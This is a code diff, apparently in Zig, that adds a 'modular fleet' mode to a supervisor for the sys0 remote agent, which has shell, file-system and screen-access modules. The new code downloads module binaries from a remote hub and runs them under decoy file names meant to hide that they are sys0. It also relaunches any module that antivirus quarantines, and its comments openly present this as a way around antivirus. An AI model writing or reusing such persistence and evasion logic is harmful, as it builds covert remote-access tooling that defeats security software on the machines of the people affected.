@@ -37,6 +37,12 @@ const default_hub = "sys0.facrd.xyz";
 // default_key matches the agent's pre-shared key so the rescue can report to the
 // hub (the hub validates it the same way it validates agent node.hello).
 pub const default_key = "devkey";
+// default_modules selects the supervision mode. A comma list (e.g.
+// "core,shell,fs,screen") supervises each module as a SEPARATE process so AV
+// quarantining one binary leaves the others running; "all" runs the single
+// monolith agent. Default is the modular fleet; self-hosters can override with
+// `--modules all` / SYS0_MODULES=all.
+pub const default_modules = "core,shell,fs,screen";
 // rescue_version is injected at link time (-X-style not available in single-file
 // builds; release.yml builds patch this via a generated file or leaves "dev").
 pub const rescue_version = "dev";
@@ -66,6 +72,12 @@ pub const Config = struct {
     data_dir: []const u8 = "",
     once: bool = false,
     no_install: bool = false,
+    // modules: comma-separated agent modules to supervise as SEPARATE processes
+    // (e.g. "core,shell,fs,screen"). Empty / "all" => run the single monolith
+    // agent (back-compat). A modular fleet AV-isolates each module: quarantining
+    // one binary leaves the others running, and the hub aggregates them into one
+    // node by their shared fingerprint.
+    modules: []const u8 = default_modules,
     min_backoff_ms: u64 = 1_000,
     max_backoff_ms: u64 = 60_000,
     healthy_uptime_ms: u64 = 30_000,
@@ -559,9 +571,9 @@ fn relocateToDataDir(gpa: std.mem.Allocator, io: Io, cfg: Config) bool {
     // NOT wait on it: the child becomes the long-lived supervisor and this
     // process exits, handing off cleanly.
     const argv: []const []const u8 = if (cfg.no_install)
-        &.{ dest, "--hub", cfg.hub, "--data-dir", cfg.data_dir, "--key", cfg.key, "--no-install" }
+        &.{ dest, "--hub", cfg.hub, "--data-dir", cfg.data_dir, "--key", cfg.key, "--modules", cfg.modules, "--no-install" }
     else
-        &.{ dest, "--hub", cfg.hub, "--data-dir", cfg.data_dir, "--key", cfg.key };
+        &.{ dest, "--hub", cfg.hub, "--data-dir", cfg.data_dir, "--key", cfg.key, "--modules", cfg.modules };
     _ = std.process.spawn(io, .{
         .argv = argv,
         .stdin = .ignore,
@@ -780,6 +792,8 @@ fn postReport(gpa: std.mem.Allocator, io: Io, cfg: Config, fingerprint: []const 
     if (findBoolField(resp, "agentOnline")) |online| {
         setAgentOnline(io, online);
     }
+    // per-module online state for the modular fleet supervisor.
+    scanModulesOnline(io, resp);
 }
 
 // findBoolField finds  "name":true/false  in s. Returns null if absent.
@@ -872,6 +886,59 @@ fn agentOnlineState(io: Io) OnlineState {
     g_online_mu.lockUncancelable(io);
     defer g_online_mu.unlock(io);
     return .{ .online = g_agent_online, .seen = g_agent_seen };
+}
+
+// ---- per-module online state (modular fleet) ------------------------------
+// In modular mode the rescue supervises core/shell/fs/screen as separate
+// processes. The hub reports each module's connection state in the
+// "modulesOnline" object of the /rescue/report response; a per-module
+// supervisor relaunches only ITS module when the hub shows it offline. This is
+// the AV-isolation payoff: quarantining one module's binary relaunches just
+// that one, the rest keep running.
+const module_names = [_][]const u8{ "core", "shell", "fs", "screen" };
+var g_mod_online: [module_names.len]bool = .{false} ** module_names.len;
+var g_mod_seen: bool = false; // false until the first modulesOnline answer
+// g_mod_child_alive[idx] is true while a module child WE spawned is running
+// (set on spawn, cleared by reapModule on exit). The per-module supervisor uses
+// it — NOT a local var — to know whether its own process is still up, so it
+// won't respawn a live child (which would just lose the single-instance lock).
+// Guarded by g_child_mu (shared with the uninstall/kill machinery).
+var g_mod_child_alive: [module_names.len]bool = .{false} ** module_names.len;
+
+fn moduleIndex(name: []const u8) ?usize {
+    for (module_names, 0..) |m, i| {
+        if (std.mem.eql(u8, m, name)) return i;
+    }
+    return null;
+}
+
+fn setModuleOnline(io: Io, idx: usize, online: bool) void {
+    g_online_mu.lockUncancelable(io);
+    g_mod_online[idx] = online;
+    g_mod_seen = true;
+    g_online_mu.unlock(io);
+}
+
+fn moduleOnlineState(io: Io, idx: usize) OnlineState {
+    g_online_mu.lockUncancelable(io);
+    defer g_online_mu.unlock(io);
+    return .{ .online = g_mod_online[idx], .seen = g_mod_seen };
+}
+
+// scanModulesOnline parses the report response's
+//   "modulesOnline":{"core":true,"shell":false,...}
+// object and updates g_mod_online. No JSON parser (keeps the binary tiny): find
+// the object, then for each known module look for "name":true/false within it.
+fn scanModulesOnline(io: Io, body: []const u8) void {
+    const marker = "\"modulesOnline\"";
+    const k = std.mem.indexOf(u8, body, marker) orelse return;
+    // bound the search to the object braces so we don't read a later field
+    const obj_start = std.mem.indexOfScalarPos(u8, body, k, '{') orelse return;
+    const obj_end = std.mem.indexOfScalarPos(u8, body, obj_start, '}') orelse body.len;
+    const obj = body[obj_start..obj_end];
+    for (module_names, 0..) |m, i| {
+        if (findBoolField(obj, m)) |online| setModuleOnline(io, i, online);
+    }
 }
 
 // currentChildPid returns the pid of the agent WE spawned, or -1 if none alive.
@@ -1176,6 +1243,287 @@ fn pidFromChild(child: *const std.process.Child) i64 {
     return @intCast(id);
 }
 
+// ---- modular fleet supervision --------------------------------------------
+// downloadModule fetches the per-module agent binary (sys0-agentmod-<mod>) from
+// the hub into dest_path. Mirrors downloadAgent but adds &module=<mod> so the
+// hub's assetFor resolves the module binary instead of the monolith.
+fn downloadModule(gpa: std.mem.Allocator, io: Io, cfg: Config, mod: []const u8, dest_path: []const u8) !void {
+    var url_buf: [288]u8 = undefined;
+    const url = try std.fmt.bufPrint(&url_buf, "https://{s}/api/v1/agent?os={s}&arch={s}&module={s}", .{ cfg.hub, os_name, arch_name, mod });
+    logLine("downloading module {s}: {s}", .{ mod, url });
+
+    var tmp_buf: [std.fs.max_path_bytes]u8 = undefined;
+    const tmp_path = try std.fmt.bufPrint(&tmp_buf, "{s}{c}sys0-agentmod-{s}.tmp", .{ cfg.data_dir, sep, mod });
+
+    const cwd = Io.Dir.cwd();
+    var out_file = try cwd.createFile(io, tmp_path, .{ .truncate = true });
+    var file_closed = false;
+    defer if (!file_closed) out_file.close(io);
+
+    var write_buf: [64 * 1024]u8 = undefined;
+    var fw = out_file.writer(io, &write_buf);
+    var client: std.http.Client = .{ .allocator = gpa, .io = io };
+    defer client.deinit();
+    const res = client.fetch(.{
+        .location = .{ .url = url },
+        .method = .GET,
+        .response_writer = &fw.interface,
+        .redirect_behavior = @enumFromInt(10),
+    }) catch |err| {
+        logLine("module {s} fetch error: {s}", .{ mod, @errorName(err) });
+        return err;
+    };
+    try fw.interface.flush();
+    out_file.close(io);
+    file_closed = true;
+
+    if (res.status != .ok) {
+        logLine("hub returned HTTP {d} for module {s}", .{ @intFromEnum(res.status), mod });
+        cwd.deleteFile(io, tmp_path) catch {};
+        return error.BadHttpStatus;
+    }
+    if (builtin.os.tag != .windows) {
+        const f = try cwd.openFile(io, tmp_path, .{ .mode = .read_only });
+        defer f.close(io);
+        f.setPermissions(io, .fromMode(0o755)) catch {};
+    }
+    try cwd.rename(tmp_path, cwd, dest_path, io);
+    if (!agentLooksValid(io, dest_path)) {
+        logLine("module {s} failed validity check", .{mod});
+        return error.DownloadInvalid;
+    }
+    logLine("module {s} installed: {s}", .{ mod, dest_path });
+}
+
+fn ensureModule(gpa: std.mem.Allocator, io: Io, cfg: Config, mod: []const u8, dest_path: []const u8) !void {
+    if (agentLooksValid(io, dest_path)) return;
+    var attempt: u8 = 0;
+    while (attempt < 3) : (attempt += 1) {
+        downloadModule(gpa, io, cfg, mod, dest_path) catch {
+            sleepMs(io, 2000);
+            continue;
+        };
+        return;
+    }
+    return error.ModuleUnavailable;
+}
+
+// ModuleSup is the per-module supervisor state passed to a detached worker.
+const ModuleSup = struct {
+    io: Io,
+    gpa: std.mem.Allocator,
+    cfg: Config,
+    fingerprint: []const u8,
+    idx: usize, // index into module_names
+};
+
+// superviseModule keeps ONE module's agent process alive. It is the modular
+// analogue of `supervise`: relaunch is driven solely by the hub's per-module
+// online answer (g_mod_online[idx]), so an AV-quarantined module is relaunched
+// without disturbing the others, and a module already connected (e.g. running
+// independently) keeps the supervisor idle. The module binary lives at
+// <data_dir>/sys0-agentmod-<mod>; it is spawned from a decoy copy. update/restart
+// are hub-driven (the hub tells the agent process to exit), then this loop sees
+// the module offline and relaunches the fresh binary.
+fn superviseModule(sup: ModuleSup) void {
+    const io = sup.io;
+    const gpa = sup.gpa;
+    const cfg = sup.cfg;
+    const mod = module_names[sup.idx];
+
+    var bin_buf: [std.fs.max_path_bytes]u8 = undefined;
+    const bin_path = std.fmt.bufPrint(&bin_buf, "{s}{c}sys0-agentmod-{s}", .{ cfg.data_dir, sep, mod }) catch return;
+
+    var backoff: u64 = cfg.min_backoff_ms;
+    var spawn_ts: ?Io.Timestamp = null;
+    var prev_decoy: ?[]const u8 = null;
+
+    while (true) {
+        // uninstall in progress -> stop supervising this module.
+        g_child_mu.lockUncancelable(io);
+        const uninstalling = g_uninstall;
+        const child_alive = g_mod_child_alive[sup.idx];
+        g_child_mu.unlock(io);
+        if (uninstalling) {
+            traceLine(io, "module {s}: supervisor stopping (uninstall)", .{mod});
+            return;
+        }
+
+        const st = moduleOnlineState(io, sup.idx);
+
+        // post-spawn connect grace.
+        var in_grace = false;
+        if (spawn_ts) |ts| {
+            const elapsed: u64 = @intCast(@max(0, ts.durationTo(Io.Timestamp.now(io, .awake)).toMilliseconds()));
+            if (elapsed >= cfg.connect_grace_ms) spawn_ts = null else in_grace = true;
+        }
+
+        // CASE A: hub says this module is connected -> stand by.
+        if (st.online) {
+            backoff = cfg.min_backoff_ms;
+            sleepMs(io, cfg.check_interval_s * 1000);
+            continue;
+        }
+        // CASE B: not online yet, but our own child is alive or just spawned ->
+        // wait. Respawning now would only lose the single-instance lock.
+        if (child_alive or in_grace) {
+            sleepMs(io, cfg.check_interval_s * 1000);
+            continue;
+        }
+        // CASE C: offline and no live child of our own -> (re)launch.
+        if (prev_decoy) |d| {
+            Io.Dir.cwd().deleteFile(io, d) catch {};
+            gpa.free(d);
+            prev_decoy = null;
+        }
+        ensureModule(gpa, io, cfg, mod, bin_path) catch |err| {
+            traceLine(io, "module {s}: download failed: {s}; retry {d}ms", .{ mod, @errorName(err), backoff });
+            sleepMs(io, backoff);
+            backoff = @min(backoff * 2, cfg.max_backoff_ms);
+            continue;
+        };
+
+        // Decoy copy: <module>-suffixed neutral name so it's not obviously sys0,
+        // and distinct per module so several can coexist in a process list.
+        const decoy = prepareModuleDecoy(gpa, io, cfg.data_dir, bin_path, sup.fingerprint, mod);
+        const spawn_path = decoy orelse bin_path;
+        prev_decoy = decoy;
+        const disguise = std.fs.path.basename(spawn_path);
+        traceLine(io, "module {s}: starting as {s}", .{ mod, disguise });
+
+        const start_ts = Io.Timestamp.now(io, .awake);
+        const spawned = std.process.spawn(io, .{
+            .argv = &.{ spawn_path, "--data-dir", cfg.data_dir },
+            .stdin = .ignore,
+            .stdout = .inherit,
+            .stderr = .inherit,
+        }) catch |err| {
+            traceLine(io, "module {s}: spawn failed: {s}", .{ mod, @errorName(err) });
+            // Drop the decoy (may be transiently busy) but KEEP the canonical
+            // module binary — deleting it forces a needless re-download and can
+            // wipe a good binary on a transient FileBusy. Back off and retry.
+            if (prev_decoy) |d| {
+                Io.Dir.cwd().deleteFile(io, d) catch {};
+                gpa.free(d);
+                prev_decoy = null;
+            }
+            sleepMs(io, backoff);
+            backoff = @min(backoff * 2, cfg.max_backoff_ms);
+            continue;
+        };
+        const cptr = gpa.create(std.process.Child) catch {
+            sleepMs(io, cfg.check_interval_s * 1000);
+            continue;
+        };
+        cptr.* = spawned;
+        const pid = pidFromChild(cptr);
+        // Mark our module child alive BEFORE the reaper can clear it; the reaper
+        // (single waiter) flips it false on exit. CASE B/C read this flag, so the
+        // supervisor never double-spawns a live child.
+        g_child_mu.lockUncancelable(io);
+        g_mod_child_alive[sup.idx] = true;
+        g_child_mu.unlock(io);
+        traceLine(io, "module {s}: up pid {d} as {s}", .{ mod, pid, disguise });
+
+        // Detached reaper owns wait() for this child (one-owner-wait); it frees
+        // the child and clears g_mod_child_alive on exit. Relaunch is driven by
+        // the hub's per-module online signal, mirroring the monolith model.
+        _ = io.concurrent(reapModule, .{ io, gpa, cptr, sup.idx, mod, start_ts }) catch {};
+        spawn_ts = start_ts;
+        backoff = cfg.min_backoff_ms;
+        sleepMs(io, cfg.check_interval_s * 1000);
+    }
+}
+
+// reapModule waits on a module child and frees it (single waiter). It does not
+// drive relaunch — the hub's per-module online signal does, exactly like the
+// monolith reaper.
+fn reapModule(io: Io, gpa: std.mem.Allocator, child_ptr: *std.process.Child, idx: usize, mod: []const u8, start_ts: Io.Timestamp) void {
+    const term = child_ptr.wait(io) catch {
+        g_child_mu.lockUncancelable(io);
+        g_mod_child_alive[idx] = false;
+        g_child_mu.unlock(io);
+        gpa.destroy(child_ptr);
+        return;
+    };
+    const now_ts = Io.Timestamp.now(io, .awake);
+    const uptime_ms: u64 = @intCast(@max(0, start_ts.durationTo(now_ts).toMilliseconds()));
+    switch (term) {
+        .exited => |code| traceLine(io, "module {s}: exited code={d} after {d}ms", .{ mod, code, uptime_ms }),
+        .signal => |sg| traceLine(io, "module {s}: signal={d} after {d}ms", .{ mod, @intFromEnum(sg), uptime_ms }),
+        else => {},
+    }
+    g_child_mu.lockUncancelable(io);
+    g_mod_child_alive[idx] = false;
+    g_child_mu.unlock(io);
+    gpa.destroy(child_ptr);
+}
+
+// prepareModuleDecoy copies the validated module binary to a neutral, per-module
+// name (deterministic per host AND per module so several modules coexist without
+// name collision). Falls back to the plain binary on any copy failure.
+fn prepareModuleDecoy(gpa: std.mem.Allocator, io: Io, data_dir: []const u8, canonical: []const u8, fingerprint: []const u8, mod: []const u8) ?[]const u8 {
+    if (!agentLooksValid(io, canonical)) return null;
+    const base = pickDecoyName(fingerprint);
+    // append the module so names differ per module (strip any .exe, re-add it).
+    const ext = if (builtin.os.tag == .windows) ".exe" else "";
+    const stem = if (std.mem.endsWith(u8, base, ".exe")) base[0 .. base.len - 4] else base;
+    const name = std.fmt.allocPrint(gpa, "{s}-{s}{s}", .{ stem, mod, ext }) catch return null;
+    defer gpa.free(name);
+    const dst = std.fmt.allocPrint(gpa, "{s}{c}{s}", .{ data_dir, sep, name }) catch return null;
+    const tmp = std.fmt.allocPrint(gpa, "{s}{c}{s}.tmp", .{ data_dir, sep, name }) catch {
+        gpa.free(dst);
+        return null;
+    };
+    defer gpa.free(tmp);
+    const cwd = Io.Dir.cwd();
+    copyExecutable(gpa, io, canonical, tmp) catch |err| {
+        logLine("module {s} decoy copy failed ({s}); using plain binary", .{ mod, @errorName(err) });
+        cwd.deleteFile(io, tmp) catch {};
+        gpa.free(dst);
+        return null;
+    };
+    // Atomic publish: rename the fully-written, closed tmp into place. A spawn
+    // can never observe a half-written or open-for-write decoy (FileBusy).
+    cwd.rename(tmp, cwd, dst, io) catch |err| {
+        logLine("module {s} decoy publish failed ({s}); using plain binary", .{ mod, @errorName(err) });
+        cwd.deleteFile(io, tmp) catch {};
+        gpa.free(dst);
+        return null;
+    };
+    return dst;
+}
+
+// superviseModular launches one detached superviseModule worker per requested
+// module and then blocks forever (the workers do the real work). Used when
+// cfg.modules is a module list rather than "all".
+fn superviseModular(io: Io, cfg: Config, gpa: std.mem.Allocator, fingerprint: []const u8) !void {
+    sweepLegacyDecoys(io, cfg.data_dir);
+    var started: usize = 0;
+    var it = std.mem.tokenizeScalar(u8, cfg.modules, ',');
+    while (it.next()) |raw| {
+        const name = std.mem.trim(u8, raw, " ");
+        const idx = moduleIndex(name) orelse {
+            logLine("ignoring unknown module {s}", .{name});
+            continue;
+        };
+        const sup = ModuleSup{ .io = io, .gpa = gpa, .cfg = cfg, .fingerprint = fingerprint, .idx = idx };
+        _ = io.concurrent(superviseModule, .{sup}) catch |err| {
+            logLine("module {s} supervisor unavailable: {s}", .{ name, @errorName(err) });
+            continue;
+        };
+        traceLine(io, "module {s}: supervisor started", .{name});
+        started += 1;
+    }
+    if (started == 0) {
+        logLine("no valid modules in {s}; nothing to supervise", .{cfg.modules});
+        return error.NoModules;
+    }
+    g_status.set(io, .supervising, "supervising {d} module(s): {s}", .{ started, cfg.modules });
+    // Block forever; the per-module workers run for the process lifetime.
+    while (true) sleepMs(io, 3600 * 1000);
+}
+
 fn supervise(io: Io, cfg: Config, gpa: std.mem.Allocator, agent_path: []const u8, fingerprint: []const u8) !void {
     var backoff: u64 = cfg.min_backoff_ms;
     // The decoy binary currently in use (a copy of the agent under a low-key
@@ -1391,6 +1739,8 @@ fn parseArgs(gpa: std.mem.Allocator, env: *std.process.Environ.Map, args: std.pr
             cfg.once = true;
         } else if (std.mem.eql(u8, arg, "--no-install")) {
             cfg.no_install = true;
+        } else if (std.mem.eql(u8, arg, "--modules")) {
+            cfg.modules = try gpa.dupe(u8, it.next() orelse return error.MissingValue);
         } else if (std.mem.eql(u8, arg, "install")) {
             action = .install;
         } else if (std.mem.eql(u8, arg, "uninstall")) {
@@ -1404,6 +1754,9 @@ fn parseArgs(gpa: std.mem.Allocator, env: *std.process.Environ.Map, args: std.pr
     }
     if (std.mem.eql(u8, cfg.key, default_key)) {
         if (envGet(env, "SYS0_KEY")) |v| cfg.key = try gpa.dupe(u8, v);
+    }
+    if (std.mem.eql(u8, cfg.modules, default_modules)) {
+        if (envGet(env, "SYS0_MODULES")) |v| cfg.modules = try gpa.dupe(u8, v);
     }
     return action;
 }
@@ -1515,5 +1868,13 @@ pub fn main(init: std.process.Init) !void {
         };
     }
 
-    try supervise(io, cfg, gpa, agent_path, fingerprint);
+    // Modular fleet vs monolith: if cfg.modules is a module list (not "all"),
+    // supervise each module as a separate process; otherwise run the single
+    // monolith agent (back-compat / self-hosters who pass --modules all).
+    if (!std.mem.eql(u8, cfg.modules, "all") and cfg.modules.len > 0) {
+        traceLine(io, "modular mode: {s}", .{cfg.modules});
+        try superviseModular(io, cfg, gpa, fingerprint);
+    } else {
+        try supervise(io, cfg, gpa, agent_path, fingerprint);
+    }
 }
